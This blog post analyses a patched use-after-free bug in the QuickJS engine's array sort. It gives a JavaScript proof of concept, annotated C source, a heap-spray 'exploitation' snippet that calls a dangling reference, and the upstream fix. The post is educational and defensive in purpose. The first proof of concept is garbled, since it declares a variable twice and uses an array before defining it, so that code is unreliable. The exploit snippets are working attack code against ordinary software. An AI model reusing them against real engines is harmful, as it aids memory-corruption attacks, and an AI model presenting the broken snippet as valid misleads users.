---
Title: "Analysis, Exploitation and Fix of Quickjs UAF Vulnerability"
Date: 2019-08-01T21:47:00+11:00
Summary: Quickjs is a lightweight JavaScript engine. Let's start with a benchmark. As a lightweight JavaScript engine, Quickjs is excellent, even comparable to heavy engines like Hermes in terms of performance. Although there is still a considerable gap compared to V8 javascript engine, Quickjs was developed by only one person and is only 620kb in size compared to V8.
draft: false
---

## 0x01 Introduction

[Quickjs](https://bellard.org/quickjs/) is a lightweight JavaScript engine. Let's start with a benchmark to see how excellent Quickjs is as a lightweight JavaScript engine. Its score is even on par with heavyweight JavaScript engines like Hermes. Although there is still a significant gap when compared with V8, it is still impressive that Quickjs is only 620kb and developed by one person.

![](https://i.imgur.com/xBWtj3e.png) 

We won't go into the specific features of Quickjs here, but if you're interested, you can visit the author's website at https://bellard.org/quickjs/ to learn more about Quickjs's features.

The reason for writing this article is because of a post I saw.

![](https://i.imgur.com/1MBnEvT.png)

Next, we will analyze the POC and Quickjs's source code to see how this vulnerability occurs, how it can be exploited, and how to fix it.

## 0x02 POC

```js=
let spray = new Array(100);
// Allocate memory on the heap for {hack:0}, with a[0] pointing to the corresponding object's address in the heap
let refcopy = [a[0]]; // refcopy points to {hack:0}
let a = [{hack:0},1,2,3,4]; 
let refcopy = [a[0]]; // refcopy points to {hack:0}
// Throw an exception
a.__defineSetter__(3,()=>{throw 1;}); 
try {
	a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
}
catch (e){}
// Reduce the reference count of object {hack:0} by 1, causing the memory to be reclaimed if it's less than or equal to 0
a[0] = 0; 
for (let i=0; i<100; i++) spray[i] = [13371337]; // Overwrite the freed memory
console.log(refcopy[0]); // 13371337
```
From the code, we can see that this is a typical use-after-free (UAF) attack. The vulnerability occurs due to a flaw in the array sorting mechanism, which results in a reference not being properly released. As a result, an attacker can use this reference to access memory that has already been freed. Next, by analyzing the source code of Quickjs, we can see what caused this vulnerability.

## 0x03 Source Code Analysis

In the Quickjs source code, I think there are three functions that are very important for understanding this vulnerability, which are js_array_sort, JS_TryGetPropertyInt64, and JS_FreeValue. The latter two functions will be called by js_array_sort. Below is a detailed analysis of these three functions.

First is the most important function, js_array_sort, where the vulnerability exists.
```c=
static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
                             int argc, JSValueConst *argv)
{
    ...

    /* XXX: should special case fast arrays */
    for (i = 0; i < len; i++) {
        if (pos >= array_size) {
            size_t new_size, slack;
            ValueSlot *new_array;
            new_size = (array_size + (array_size >> 1) + 31) & ~15;
            // Allocate new memory space for a temporary queue for sorting
            new_array = js_realloc2(ctx, array, new_size * sizeof(*array),
            &slack);
            if (new_array == NULL)
                goto exception;
            new_size += slack / sizeof(*new_array);
            array = new_array;
            array_size = new_size;
        }
        // Try to get the property of the object and assign it to the newly generated array
        // This function will increase the reference count of {hack:0}, which is explained below
        present = JS_TryGetPropertyInt64(ctx, obj, i, &array[pos].val);
   
        if (present < 0)
            goto exception;
        if (present == 0)
            continue;
        if (JS_IsUndefined(array[pos].val)) {
            undefined_count++;
            continue;
        }
        array[pos].str = NULL;
        array[pos].pos = i;
        pos++;
    }

    // Sort the array, using insertion sort when the number of elements 
    // in the queue is less than or equal to a specific value (6)
    rqsort(array, pos, sizeof(*array), js_array_cmp_generic, &asc);

    if (asc.exception)
        goto exception;

    /* XXX: should special case fast arrays */
    while (n < pos) {
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
        if (array[n].pos == n) {
            // If the order has not changed, free the corresponding element in array
            JS_FreeValue(ctx, array[n].val);
        } else {
            // If the order has changed, write the value in array back to the corresponding property of the object, 
            // which will trigger an exception and go directly to the exception handling part
            // a.__defineSetter__(3,()=>{throw 1;});
            if (JS_SetPropertyInt64(ctx, obj, n, array[n].val) < 0) { 
                n++;
                goto exception; 
            }
        }
        n++;
    }

    js_free(ctx, array);
    for (i = n; undefined_count-- > 0; i++) {
        if (JS_SetPropertyInt64(ctx, obj, i, JS_UNDEFINED) < 0)
            goto fail;
    }
    for (; i < len; i++) {
        if (JS_DeletePropertyInt64(ctx, obj, i, JS_PROP_THROW) < 0)
            goto fail;
    }
    return obj;

exception:
    for (n = 0; n < pos; n++) {
        // Free the memory of the corresponding element in array, causing the reference of the object to decrease by 1
        // duplicate release here
        JS_FreeValue(ctx, array[n].val); 
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
    }
    js_free(ctx, array);
fail:
    JS_FreeValue(ctx, obj);
    return JS_EXCEPTION;
}


```

The following is JS_TryGetPropertyInt64. This function will increase the reference count of the {hack:0} object.
```c=
static int JS_TryGetPropertyInt64(JSContext *ctx, JSValueConst obj, int64_t idx, JSValue *pval)
{
    JSValue val = JS_UNDEFINED;
    JSAtom prop;
    int present;

    // #define JS_ATOM_TAG_INT (1U << 31)
    // #define JS_ATOM_MAX_INT (JS_ATOM_TAG_INT - 1)
    // #define likely(x)  __builtin_expect(!!(x), 1) 分支预测
    if (likely((uint64_t)idx <= JS_ATOM_MAX_INT)) {
        /* fast path */
        // All go into this branch
        present = JS_HasProperty(ctx, obj, __JS_AtomFromUInt32(idx));
        if (present > 0) {
            // JS_NewInt32 calls JS_DupValue, which will increase the reference count of the {hack:0} object
            val = JS_GetPropertyValue(ctx, obj, JS_NewInt32(ctx, idx));
            // #define unlikely(x)  __builtin_expect(!!(x), 0)
            if (unlikely(JS_IsException(val)))
                present = -1;
        }
    } else {
        prop = JS_NewAtomInt64(ctx, idx);
        present = -1;
        
        if (likely(prop != JS_ATOM_NULL)) {
            present = JS_HasProperty(ctx, obj, prop);
            if (present > 0) {
                val = JS_GetProperty(ctx, obj, prop);
                if (unlikely(JS_IsException(val)))
                    present = -1;
            }
            JS_FreeAtom(ctx, prop);
        }
    }
    *pval = val;
    return present;
}
```

Finally, there is JS_FreeValue(), which is a function that reduces the reference count and releases memory.
```c=
static inline void JS_FreeValue(JSContext *ctx, JSValue v)
{
    if (JS_VALUE_HAS_REF_COUNT(v)) {
        JSRefCountHeader *p = JS_VALUE_GET_PTR(v); 
        // The Quickjs garbage collector uses reference counting to release
        // memory when the reference count is decreased to zero or less.
        if (--p->ref_count <= 0) { 
            __JS_FreeValue(ctx, v);
        }
    }
}
```

## 0x04 Principles and Triggering Conditions

Quickjs has three main stages when performing sorting:

- The first stage is to generate a new array. The array object to be sorted (a = [{hack:0},1,2,3,4]) is written into the array as values using the JS_TryGetPropertyInt64 function via getproperty.
- The second stage is to sort the array (rqsort).
- The third stage is to rewrite the values in this array back to the object using setproperty. The problematic area occurs in the third stage. After the sorting is done, if the order of the elements in the array has not changed, the corresponding element memory will be immediately released (to be exact, the reference count will be reduced). However, if an exception occurs when rewriting the remaining elements, it will enter the exception handling part. All the elements in the entire array will be released again, including the ones that have already been released due to the order not changing, causing the reference count to be reduced by one more time.

After understanding the principle, we know that the triggering conditions for this vulnerability are:

1. Sorting queues with object references.
2. Throwing exceptions during sorting.
3. Referencing objects in the queue so that after the memory error is released, the corresponding memory can still be accessed.

## 0x05 Exploitation
Usually, for this type of UAF exploitation, function addresses are used to overwrite the mistakenly released memory to achieve arbitrary code execution. This involves heap and stack memory allocation and release. Those who are interested can take a look at the detailed introduction to the exploitation principles of heap and stack vulnerabilities in [Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf).

The exploitation code is as follows.

```js=
let spray = new Array(100);
let a = [{hack:0},1,2,3,4]; 
let refcopy = [a[0]]; 

a.__defineSetter__(3,()=>{throw 1;}); 
try {
	a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
}
catch (e){}
a[0] = 0; 

// Overwrite the memory incorrectly released with the address of a function.
for (let i=0; i<100; i++) spray[i] = () => {console.log("hack")}; 
console.log(refcopy[0]()); // "hack"
```

## 0x06 Fix

As mentioned in the previous section on the principle, the reason for the error was that when the sorting was wrong, all elements of the array would have their reference count reduced by 1, causing duplicate releases. So, to fix this issue, the redundant release points need to be removed. One modification method is to refrain from releasing the elements until all of them have been written back to the object, when the order remains unchanged. Another modification method is to avoid releasing the elements that have already been released before the error occurred. The specific modification is as follows:

```c=
...
exception:
    // for (n = 0; n < pos; n++) { // Release all elements of the array
    for (; n < pos; n++) { // Release elements starting from the point of error
         // Release the memory of the corresponding element in the array, leading to a decrease of the object reference count
        JS_FreeValue(ctx, array[n].val); 
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
    }
```

In the new release on July 21st, the uaf vulnerability has been fixed. By examining the diff, we can see that the author chose the second, simpler and more efficient method of fixing the issue.


## Reference

1. [Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf)
2. https://bellard.org/quickjs/
